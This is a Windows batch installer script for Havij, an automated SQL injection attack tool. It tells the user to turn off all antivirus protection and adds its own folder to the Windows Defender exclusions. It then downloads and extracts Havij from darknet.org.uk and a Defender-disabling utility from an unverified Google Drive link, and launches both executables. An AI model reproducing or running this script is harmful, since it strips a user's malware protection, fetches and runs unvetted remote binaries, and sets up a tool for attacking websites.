@echo off

:: Get the current script path
set "SCRIPT_PATH=%~dp0"

echo ::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo 	Havij Installer by Arena Web Security
echo ::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo.
echo.
echo Turn off every Virus and Threat Protection
echo.

set tCommand=
for /f "tokens=*" %%i in ('echo %ProgramFiles%\Windows Defender\MSASCui.exe') do set tCommand=%%i
if not exist "%tCommand%" set tCommand=windowsdefender://Threatsettings
start "" "%tCommand%"


powershell -Command "Add-MpPreference -ExclusionPath \"%SCRIPT_PATH%\""

cd /d "%SCRIPT_PATH%"

echo.
echo Do You Want To Download Havij?
echo.

pause

:: Download Havij
powershell -Command "Invoke-WebRequest https://www.darknet.org.uk/content/files/Havij_1.12_Free.zip -OutFile .\Havij_1.12_Free.zip"

echo.
echo.
echo Please Enter passphrase "darknet123" to continue.
echo.
echo.

:: Extract the Havij_1.12_Free.zip file
tar -xf "%SCRIPT_PATH%\Havij_1.12_Free.zip"


echo.
echo Do You Want To Download dControl?
echo.

pause

:: Download DefenderControl
powershell -Command "Invoke-WebRequest -Uri 'https://drive.google.com/uc?id=1kri2u0wKa0N2PXoY0jiWyW-RCYZPo4qk' -OutFile '%SCRIPT_PATH%\Defender_Control.zip'"
::powershell -Command "Invoke-WebRequest https://www.sordum.org/files/downloads.php?st-defender-control -OutFile .\Defender_Control.zip"

:: Extract the Defender_Control.zip file
tar -xf "%SCRIPT_PATH%\Defender_Control.zip"


echo.
echo.
echo Please Enter passphrase "sordum" to continue.
echo.
echo.

:: Extract the Defender_Control.zip file
tar -xf "%SCRIPT_PATH%\dControl\dControl.zip"

pause

echo.
echo Starting dControl
echo.

"%SCRIPT_PATH%\dControl\dControl.exe"

pause

echo.
echo Starting dControl
echo.

"%SCRIPT_PATH%\Havij 1.12 Free.exe"

pause

:: Optionally, change the directory back to the original path
cd /d "%~dp0"
